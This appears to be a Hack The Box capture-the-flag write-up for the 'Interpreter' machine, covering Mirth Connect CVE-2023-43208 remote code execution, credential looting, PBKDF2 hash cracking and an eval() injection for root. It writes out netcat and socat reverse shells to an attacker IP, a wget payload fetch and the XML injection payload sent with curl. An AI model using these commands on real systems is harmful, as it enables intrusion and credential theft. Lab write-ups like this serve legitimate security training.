---
layout: post
title: "Interpreter (Medium) - HTB writeup"
---

# Introduction
Interpreter is a medium linux machine. On port 443 we find a Mirth Connect login page. We can download a .jnlp which contains information about the version of Mirth Connect. We then find a RCE vulnerablility for that version and exploit it to get a shell. Inside a config file there's mysql database credentials. By retrieving a password hash from the database and cracking it we get ssh access. \
For root there's an internal server running on port 54321. We can find the source code in /usr/local/bin/notif.py and inside there's a function which calls eval() on unsanitized user supplied input which leads to code execution as root.

# USER
During nmap scan we find ports 22, 80, 443 and 6661 open. After visiting the website we are presented with a Mirth Connect login page. We can click on **Download Administrator Launcher** which will download a **webstart.jnlp** file. Inside we can find the version:
```
<application-desc main-class="com.mirth.connect.client.ui.Mirth">
    <argument>https://interpreter.htb:443</argument>
    <argument>4.4.0</argument>
</application-desc>
```

After searching for some CVEs I found this unauthenticated RCE: [CVE-2023-43208](https://nvd.nist.gov/vuln/detail/cve-2023-43208) and a [PoC](https://github.com/K3ysTr0K3R/CVE-2023-43208-EXPLOIT) for it. The PoC crafts a xml payload which then gets deserialized leading to remote code execution.\
There's nc installed on the machine so we can use it to get a reverse shell.
```
$ python3 CVE-2023-43208.py -u "https://interpreter.htb" -c "nc 10.10.15.199 4445 -e /bin/bash" -p unix
```

```
$ nc -lvnp 4445
listening on [any] 4445 ...
connect to [10.10.15.199] from (UNKNOWN) [10.129.6.1] 43968

whoami
mirth
```
\
Now that we have foothold we can look around the files.\
Inside ```/usr/local/mirthconnect/conf/mirth.properties```  there are mysql credentials and the database name:
```
database.url = jdbc:mariadb://localhost:3306/mc_bdd_prod
...
database.username = mirthdb
database.password = MirthPass123!
```
\
First I need to upgrade my shell to an interactive one, I'll transfer socat onto the machine and get a new reverse shell.\

Start a http server with socat in your directory: 
```
$ python3 -m http.server 80
```
and download it to /tmp on the victim machine and make it executable:
```
wget http://10.10.15.199/socat
chmod +x socat
```

Now start a new listener and execute socat:
```
$ nc -lvnp 4446

On the box:
socat TCP:10.10.15.199:4446 EXEC:'sh',pty,stderr,setsid,sigint,sane
```
With this socat shell we can now connect to the database.
```
mysql -u mirthdb -P 3306 -D mc_bdd_prod -p
Enter password: MirthPass123!
```

There's one interesting table called ```PERSON_PASSWORD```.\
Inside it there's this password hash:
```
u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==
```
\
Inside [nextgen docs](https://docs.nextgen.com/en-US/mirthc2ae-connect-by-nextgen-healthcare-user-guide-3281761/default-digest-algorithm-in-mirthc2ae-connect-4-4-62159) we learn that in version 4.4 the hashing algorithm was changed to **PBKDF2WithHmacSHA256** with the iteration count being 600000.\
Also inside the [upgrade guide](https://github.com/nextgenhealthcare/connect/wiki/4.4.0---Upgrade-Guide) on github we see that the salt size is 8 bytes.\\
\
If we want to crack it using hashcat we have to use this format:
```
sha256:iteration_count:base64(salt):base64(hash)
```
\
The salt will either be the first 8 bytes or the last 8 bytes. I'll try to crack it using the first 8 bytes as the salt first. Here's my python script that will give us the hash in a hashcat format:

```python
import base64

salt_hash = base64.b64decode("u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==")
salt = salt_hash[:8]
digest = salt_hash[8:] 

print(b"sha256:600000:" + base64.b64encode(salt) + b":" + base64.b64encode(digest))

```
Running it will give us this output which we can the use in hashcat:
```
$ python hash.py
sha256:600000:u/+LBBOUnac=:YshQbDDqCAzy21EdK5OfZBJD1Ne4rXa1VgP5CzLd8Ps=

$ echo "sha256:600000:u/+LBBOUnac=:YshQbDDqCAzy21EdK5OfZBJD1Ne4rXa1VgP5CzLd8Ps=" > hash
$ hashcat hash ~/Downloads/rockyou

Session..........: hashcat
Status...........: Cracked
sha256:600000:u/+LBBOUnac=:YshQbDDqCAzy21EdK5OfZBJD1Ne4rXa1VgP5CzLd8Ps=:snowflake1
```
We can now ssh into **sedric** and retrieve user.txt flag.

# ROOT
After some enumeration we can see that there's something listening on port 54321:
```
sedric@interpreter:~$ ss -l
...
127.0.0.1:54321
...
```

I'll forward this port to my local machine using ssh:
```
$ ssh -L 54321:localhost:54321 sedric@interpreter.htb
```

We can now visit http://localhost:54321/ and we see error 404. Directory fuzzing didn't yield any results, so I'll do more enumeration on the machine.\
\
After some searching we find a python file inside ```/usr/local/bin/notif.py```\
Inside it we see that we should be able to send a request to ```/addPatient```. Doing so confirms that this is indeed the server running on 54321.\
Here the vulnerability lies in the ```return eval(f"f'''{template}'''")```.\
We can craft a request that contains an xml payload which will get evaluated leading to code execution.\
First the program checks if ```<patient>``` tag exists:
```
patient = xml_root if xml_root.tag=="patient" else xml_root.find("patient")
if patient is None:
        return "No <patient> tag found\n", 400
```

Then it passes different tag values to ```template``` function, where each value gets matched to a regex, and if it passes, the payload gets evaluated. The regex allows all alphabet letters, numbers and ```._"(){}=+/]+$``` special chars. We are kind of limited as we cannot use whitespaces but that's not a big issue. \
We can craft and use this xml payload to read ```/root/root.txt``` flag:

```xml
<patient>
	<firstname>{open("/root/root.txt").read()}</firstname>
	<lastname>pwned</lastname>
	<sender_app>pwned</sender_app>
	<timestamp>2025/10/10</timestamp>
	<birth_date>01/01/1999</birth_date>
	<gender>M</gender>
</patient>
```

And use curl to send the request:
```
$ curl -X POST http://127.0.0.1:54321/addPatient \
  -H "Content-Type: application/xml" \
  -d '<patient>
        <firstname>{open("/root/root.txt").read()}</firstname>
        <lastname>pwned</lastname>
        <sender_app>pwned</sender_app>
        <timestamp>2025/10/10</timestamp>
        <birth_date>01/01/1999</birth_date>
        <gender>M</gender>
</patient>'
Patient 8710db8860d6[REDACTED_FLAG]
 pwned (M), 27 years old, received from pwned at 2025/10/10%
```
